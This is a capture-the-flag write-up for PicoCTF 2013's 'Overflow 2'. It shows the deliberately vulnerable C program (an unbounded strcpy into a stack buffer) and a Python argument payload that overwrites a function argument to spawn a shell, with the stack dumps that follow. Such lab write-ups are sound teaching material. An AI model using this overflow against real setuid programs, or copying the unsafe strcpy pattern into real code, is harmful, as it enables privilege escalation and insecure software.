# PicoCTF 2013: Overflow 2

**Category:** Binary Exploitation
**Points:** 100
**Description:**

>Stack overflows are the most basic binary exploitation technique, but they
>take a lot of skill to master. If you already know some C, these problems can
>help acquaint you with stacks and binary exploitation in general.

>Problem available on the shell machine in
>/problems/stack_overflow_2_44e63640e033ff2b , downloadable [here](https://2013.picoctf.com/problems/overflow2-44e63640e033ff2b) with source
>[here](https://2013.picoctf.com/problems/overflow2-44e63640e033ff2b.c).

>If you solve the problem you will be able to read the key file by running

>cat /problems/stack_overflow_2_44e63640e033ff2b/key
>on the PicoCTF shell machine.

>**Hint:** A function's arguments live on top of its stack frame, above its
>saved ebp and return address. Make sure not to clobber those, though...


## Write-up
Looking at the source, this problem is nearly identical to Overflow 1
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "dump_stack.h"

void vuln(int win, char *str) {
    char buf[64];
    strcpy(buf, str);
    dump_stack((void **) buf, 23, (void **) &win);
    printf("win = %d\n", win);
    if (win == 1) {
        execl("/bin/sh", "sh", NULL);
    } else {
        printf("Sorry, you lose.\n");
    }
    exit(0);
}

int main(int argc, char **argv) {
    if (argc != 2) {
        printf("Usage: stack_overwrite [str]\n");
        return 1;
    }

    uid_t euid = geteuid();
    setresuid(euid, euid, euid);
    vuln(0, argv[1]);
    return 0;
}
```
All we have to do is set win equal to 1 and we get a shell. Let's try filling
up our buffer and writing one more character.

```
$(python -c 'print "A"*64 + "B"')
Stack dump:
0xffe0c7a8: 0x000003e8
0xffe0c7a4: 0xffe0d848 (second argument)
0xffe0c7a0: 0x00000000 (first argument)
0xffe0c79c: 0x0804870b (saved eip)
0xffe0c798: 0xffe0c7c8 (saved ebp)
0xffe0c794: 0xf773c000
0xffe0c790: 0xf7640042
0xffe0c78c: 0x41414141
0xffe0c788: 0x41414141
0xffe0c784: 0x41414141
0xffe0c780: 0x41414141
0xffe0c77c: 0x41414141
0xffe0c778: 0x41414141
0xffe0c774: 0x41414141
0xffe0c770: 0x41414141
0xffe0c76c: 0x41414141
0xffe0c768: 0x41414141
0xffe0c764: 0x41414141
0xffe0c760: 0x41414141
0xffe0c75c: 0x41414141
0xffe0c758: 0x41414141
0xffe0c754: 0x41414141
0xffe0c750: 0x41414141 (beginning of buffer)
win = 0
Sorry, you lose.
```
It didn't quite work that time, but all we need is 16 more characters after 
our buffer and "\x01" to get a shell!
```
$ ./overflow2-44e63640e033ff2b $(python -c 'print "A"*64 + "B"*16 + "\x01"')
Stack dump:
0xff915b18: 0x000003e8
0xff915b14: 0xff917838 (second argument)
0xff915b10: 0x00000001 (first argument)
0xff915b0c: 0x42424242 (saved eip)
0xff915b08: 0x42424242 (saved ebp)
0xff915b04: 0x42424242
0xff915b00: 0x42424242
0xff915afc: 0x41414141
0xff915af8: 0x41414141
0xff915af4: 0x41414141
0xff915af0: 0x41414141
0xff915aec: 0x41414141
0xff915ae8: 0x41414141
0xff915ae4: 0x41414141
0xff915ae0: 0x41414141
0xff915adc: 0x41414141
0xff915ad8: 0x41414141
0xff915ad4: 0x41414141
0xff915ad0: 0x41414141
0xff915acc: 0x41414141
0xff915ac8: 0x41414141
0xff915ac4: 0x41414141
0xff915ac0: 0x41414141 (beginning of buffer)
win = 1
$
```
The hint said not to clobber the saved ebp and eip arguments, but those don't
matter for this problem. You'll get a shell before the `ret` instruction
occurs, so you don't have to worry :)

pwn.

## Other write-ups and resources

* none yet
